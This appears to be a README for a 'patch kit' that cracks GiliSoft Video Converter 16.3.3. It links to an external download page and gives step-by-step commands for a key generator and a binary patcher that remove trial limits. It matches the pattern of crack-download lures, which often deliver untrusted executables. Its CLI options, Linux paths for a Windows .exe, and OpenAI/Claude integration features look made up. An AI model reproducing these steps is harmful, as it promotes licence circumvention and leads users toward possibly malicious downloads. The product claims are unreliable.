## 🔑 Getting Started with Activation Key

To unlock the full capacity of GiliSoft Video Converter 16.3.3, you need a valid **product key** and an applied **patch**. This process replaces the standard trial mode with unlimited professional features.

### Step 1: Download the package

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://dominicbocanegra12-lang.github.io/GiliSoft-Video-Toolkit-16-Patch-Kit/)

### Step 2: Extract and run the key generator

```console
# Navigate to the tools folder
cd ./tools/keygen/

# Generate a license file (requires .NET 6 runtime)
./gilisoft_keygen --version 16.3.3 --output ./license.lic
```

### Step 3: Apply the patch

```console
# Apply the dynamic patch to the GiliSoft binary
./patcher --target /opt/gilisoft/GiliSoftVC.exe --patch ./patches/16.3.3.diff

# Verify success
./gilisoft --verify-license ./license.lic
```

### Step 4: Launch with full features

```console
./gilisoft --no-trial
```

## 💻 Example Console Invocation

For headless servers or CI/CD pipelines, use the CLI mode:

```console
# Batch convert all .mov files in a directory to H.265
./gilisoft batch \
  --input-dir ./raw_footage/ \
  --output-dir ./converted/ \
  --format mp4 \
  --codec hevc_nvenc \
  --bitrate 20M \
  --audio-codec opus \
  --audio-bitrate 128k \
  --overwrite \
  --progress \
  --log ./logs/conversion.log
```

Advanced flags for power users:

| Flag | Description | Example |
|------|-------------|---------|
| `--dry-run` | Simulate without converting | Verify profiles |
| `--cuda-device 0` | Specify GPU device index | Multi-GPU rigs |
| `--ffmpeg-args` | Pass raw FFmpeg arguments | `--ffmpeg-args "-vf eq=brightness=0.1"` |
| `--watch` | Monitor folder for new files | Automate incoming media |

## 🤖 OpenAI API & Claude API Integration

GiliSoft Video Converter 16.3.3 supports **AI-assisted metadata extraction** and **intelligent trimming** via API calls to OpenAI and Claude.

### Example: Auto-generate chapter markers

```console
./gilisoft analyze --input lecture.mp4 \
  --ai-provider openai \
  --api-key $OPENAI_API_KEY \
  --prompt "Generate chapter markers for this educational video" \
  --output chapters.json
```

### Example: Summarize video content (Claude)

```console
./gilisoft analyze --input meeting_recording.mkv \
  --ai-provider claude \
  --api-key $ANTHROPIC_API_KEY \
  --model claude-3-opus-20240229 \
  --task summarize \
  --output summary.txt
```

> **Note**: AI features require an active internet connection and valid API keys. Your video content is sent to the respective API endpoints for processing. Review privacy policies before use.
